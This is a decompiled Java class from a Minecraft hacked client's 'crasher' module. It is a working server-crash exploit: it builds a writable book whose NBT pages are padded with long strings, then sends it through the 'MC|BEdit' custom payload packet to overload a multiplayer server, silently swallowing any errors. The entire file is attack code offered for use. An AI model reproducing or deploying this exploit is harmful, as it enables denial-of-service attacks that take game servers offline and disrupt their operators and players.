// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.cpc;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketCustomPayload;
import net.minecraft.network.PacketBuffer;
import io.netty.buffer.Unpooled;
import net.minecraft.item.ItemStack;
import net.minecraft.init.Items;
import net.minecraft.client.Minecraft;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagCompound;

public class CustomPayloadCrasher13
{
    public static void start() {
        final NBTTagCompound comp = new NBTTagCompound();
        final NBTTagList list = new NBTTagList();
        String bert = "";
        for (int i = 0; i < 2040; ++i) {
            bert = String.valueOf(String.valueOf(bert)) + ".";
        }
        for (int i = 0; i < 4; ++i) {
            list.appendTag(new NBTTagString(bert));
        }
        final NBTTagCompound nbtTagCompound = comp;
        final String key = "author";
        Minecraft.getMinecraft();
        nbtTagCompound.setString(key, Minecraft.getSession().getUsername());
        comp.setString("title", "CustomPayLoadCrasherBypess_II");
        comp.setByte("resolved", (byte)1);
        comp.setTag("pages", list);
        final ItemStack stack = new ItemStack(Items.WRITABLE_BOOK);
        stack.setTagCompound(comp);
        try {
            final PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            buffer.writeItemStackToBuffer(stack);
            Minecraft.getMinecraft().player.connection.sendPacket(new CPacketCustomPayload("MC|BEdit", buffer));
        }
        catch (final Throwable buffer2) {}
    }
}
